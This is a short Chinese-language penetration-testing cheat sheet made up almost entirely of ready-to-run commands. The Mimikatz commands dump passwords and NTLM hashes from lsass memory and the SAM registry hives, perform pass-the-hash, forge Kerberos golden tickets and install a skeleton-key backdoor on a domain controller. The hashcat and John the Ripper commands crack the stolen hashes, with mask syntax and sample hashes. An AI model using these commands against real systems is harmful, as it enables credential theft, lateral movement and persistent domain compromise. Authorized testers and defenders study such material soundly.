Mimikatz
(1)在线获取lsass进程中的密码
privilege::debug
sekurlsa::logonPasswords full
(2)离线获取
procdump.exe -accepteula -64 lsass.exe lsass.dump
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords full
(3)在线读取sam数据库获取Hash
privilege::debug
token::elevate
lsadump::sam
(4)离线读取sam数据库获取Hash
使用reg命令导出注册表
reg save hklm\\sam c:\sam.hive
reg save hklm\\system c:\system.hive
读取Hash:
privilege::debug
lsadump::sam /system:system.hive /sam:sam.hive
(5)Pass-The-Hash攻击
privilege::debug
sekurlsa::pth /user:Administrator /domain:. /ntlm:xxxx dir \\\\192.168.xxxx.xxx\\c$
(6)Golden Ticket
privilege::debug
kerberos::golden /user:admin /domain:pentestlab.com
/sid:xxx /krbtgt:xxx /admin:admin.tck /ptt dir \\\\dc.pentestlab.cvom\\c$
(7)Skeleton Key
privilege::debug
misc::skeleton
(8)获取系统进程列表
process::list

# **HashCat**

`hashcat -m 1000 -a 0 --force 31d6cfe0d16ae931b73c59d7e0c089c0 pass.txt`		
	`-m 指定模式 1000为ntlm v1 5600位ntlm v2`  300为mysql4.1/mysql5
	`-a 指定破解模式 0位字典破解`
	`然后后面为ntlm hash和字典`

myql数据库:
hashcat -m 300 -a 3 --force 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B  ?l?l?l?l


`hashcat -m 1000 -a 3 --force 31d6cfe0d16ae931b73c59d7e0c089c0 ?l?l?l?l?l?l?l`
`?l              代表小写字母`
`?u              代表大写字母`
`?d              代表数字`
`?s              代表特殊字符`
`?a              代表大小写字母、数字以及特殊字符`  
`?b              0x00-0xff` 

`0    straight                                字典破解`
`1    combination                             将字典中密码进行组合（1 2 ——> 11 22 12 21）`
`3    brute-force                             使用指定掩码破解`
`6    Hybrid Wordlist + Mask                  字典+掩码破解`
`7    Hybrid Mask  + Wordlist                 掩码+字典破解`

`john --wordlist=/path/to/wordlist.txt --format=NT hashes.txt`
`john --mask=?l?l?l?l?l?l?d?d --format=NT hashes.txt`
 john --format=NT hash.txt


hashcat -m 300 -a 3 --force fc7519796812042ed564fc4cd3fa201d ?a?a?a?a?a?a?a?a

#md5
hashcat -m 0 -a 3 --force fc7519796812042ed564fc4cd3fa201d ?d?d?d?d?d?d?d?d

fc7519796812042ed564fc4cd3fa201d
ffe317ecad2405070e6f5ffefb3a38a5